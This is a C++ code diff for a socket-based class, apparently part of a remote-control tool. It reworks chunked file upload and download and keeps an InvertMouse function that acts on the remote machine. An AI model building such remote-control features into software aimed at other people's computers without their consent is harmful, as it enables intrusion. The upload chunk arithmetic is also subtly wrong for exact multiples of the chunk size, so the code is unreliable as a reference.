@@ -59,14 +59,6 @@ public:
 		return true;
 	}
 
-	static bool GetInfo(SOCKET Sock, string Str)
-	{
-		if (TcpIP::SendString(Sock, Str))
-			return true;
-
-		return false;
-	}
-
 	static bool InvertMouse(SOCKET Sock, bool MouseStatus)
 	{
 		if (MouseStatus)
@@ -104,11 +96,11 @@ public:
 		return NC;
 	}
 
-	static string PingPong(SOCKET Sock, string Res)
+	static string PingPong(SOCKET Sock, string send)
 	{
 		string Buff = "";
 
-		if (!TcpIP::SendString(Sock, Res))
+		if (!TcpIP::SendString(Sock, send))
 			return "";
 
 		if (!TcpIP::RecvString(Sock, Buff))
@@ -117,75 +109,133 @@ public:
 		return Buff;
 	}
 
-	static bool DownloadFileWithLoading(SOCKET Sock, string& FileName, string& FileContent)
+	static short DownloadFileWithLoading(SOCKET Sock)
 	{
+		DirUtils du;
 		string strFileSize;
+		string FileName;
 		string Buff = "";
+		int ChunkSize = 64000;
+		short rtnValue = 0;
 
 		if (!TcpIP::RecvString(Sock, FileName))
-			return false;
+			return 1;
 
 		if (!TcpIP::RecvString(Sock, strFileSize))
-			return false;
+			return 1;
 
-		int FileSize = stoi(strFileSize);
+		debug.log.Info("\nNome: " + FileName + "\nDimensione: " + strFileSize);
 
-		if (FileSize > 100)
+		if (!TcpIP::RecvString(Sock, Buff))
+			return 1;
+
+		if (Buff == "KO")
+			return 2;
+
+		Buff.clear();
+
+		if (du.CheckFile(FileName))
+			du.DelFile(FileName);
+
+		if (!du.WriteFile(FileName))
+			rtnValue = 2;
+
+		long long FileSize = stoll(strFileSize);
+
+		debug.log.Info("Ricezione in corso...");
+
+		if (FileSize > ChunkSize)
 		{
-			int ChunkSize = FileSize / 100;
-			int ChunkNumber = FileSize / ChunkSize;
+			int ChunkNumber = (FileSize / ChunkSize) + (FileSize % ChunkSize == 0 ? 0 : 1);
 
 			for (int i = 0; i < ChunkNumber; i++)
 			{
 				if (!TcpIP::RecvString(Sock, Buff))
-					return false;
+					return 1;
 
-				FileContent += Buff;
+				if (!du.AppendToBinaryFile(FileName, Buff))
+					rtnValue = 2;
+
 				Buff.clear();
 			}
 		}
-		else
+		else if (FileSize > 0)
 		{
-			if (!TcpIP::RecvString(Sock, FileContent))
-				return false;
+			if (!TcpIP::RecvString(Sock, Buff))
+				return 1;
 
+			if (!du.AppendToBinaryFile(FileName, Buff))
+				rtnValue = 2;
 		}
 
-		return true;
+		debug.log.Info("File ricevuto " + to_string(rtnValue));
+
+		return rtnValue;
 	}
 
-	static bool UploadFileWithLoading(SOCKET Sock, string FileName, string FileContent)
+	static bool UploadFileWithLoading(SOCKET Sock, string FileName, string FilePath)
 	{
-		string Buff;
+		DirUtils du;
+		ifstream infile;
+		long long FileSize = du.GetSizeOfFile(FilePath);
+		int ChunkSize = 64000;
+		string Buff(ChunkSize, '\0');
+
+		debug.log.Info("\nNome: " + FileName + "\nDimensione: " + to_string(FileSize));
 
 		if (!TcpIP::SendString(Sock, FileName))
 			return false;
 
-		if (!TcpIP::SendString(Sock, to_string(FileContent.size())))
+		if (!TcpIP::SendString(Sock, to_string(FileSize)))
 			return false;
 
-		if (FileContent.size() > 100)
+		infile.open(FilePath.c_str(), std::ios::binary);
+		if (!infile.is_open())
 		{
-			int ChunkSize = FileContent.size() / 100;
-			int ChunkNumber = FileContent.size() / ChunkSize;
-
-			for (int i = 0; i < ChunkNumber; i++)
-			{
-				if (i + 1 == ChunkNumber)
-				{
-					if (!TcpIP::SendString(Sock, FileContent.substr(ChunkSize * i)))
-						return false;
-				}
-				else
-					if (!TcpIP::SendString(Sock, FileContent.substr(ChunkSize * i, ChunkSize)))
-						return false;
-			}
+			if (!TcpIP::SendString(Sock, "KO"))
+				return false;
+			return true;
 		}
 		else
 		{
-			if (!TcpIP::SendString(Sock, FileContent))
+			if (!TcpIP::SendString(Sock, "OK"))
 				return false;
 		}
+
+		debug.log.Info("Invio in corso...");
+
+		if (FileSize > ChunkSize)
+		{
+			int ChunkNumber = (FileSize / ChunkSize) + (FileSize % ChunkSize == 0 ? 0 : 1);
+
+			for (int i = 0; i < ChunkNumber; i++)
+			{
+				Buff.clear();
+
+				if (i + 1 == ChunkNumber)
+					Buff = string((int)(FileSize - (ChunkSize * (ChunkNumber - (FileSize % ChunkSize == 0 ? 0 : 1)))), '\0');
+				else
+					Buff = string(ChunkSize, '\0');
+
+				infile.read(&Buff[0], Buff.size());
+
+				if (!TcpIP::SendString(Sock, Buff))
+				{ infile.close(); return false; }
+			}
+
+			Buff.clear();
+			infile.close();
+		}
+		else if (FileSize > 0)
+		{
+			infile.close();
+
+			if (!TcpIP::SendString(Sock, du.GetBinaryFileContent(FilePath)))
+				return false;
+		}
+
+		infile.close();
+		debug.log.Info("File inviato");
 
 		return true;
 	}
